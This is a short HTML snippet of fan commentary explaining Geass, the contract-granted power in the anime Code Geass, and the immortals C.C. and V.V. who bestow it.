<p>Described by C.C. as the "Power of Kings", Geass is an ability that can be transferred by a means of 
a contract. The Geass is a special ability that varies from user to user, and due to this fact, its power 
and limitations are not completely known.</p> 

<p>From what is known so far, a Geass is given to a regular person by an immortal. The immortal was
once a Geass user, but has received a "code" to become immortal, and is now able to transfer Geass abilities
to any number of people. The series focuses on two immortals: C.C. and V.V. It is not known whether the user
loses his name gains the initials, or whether this choice is voluntary.</p>';
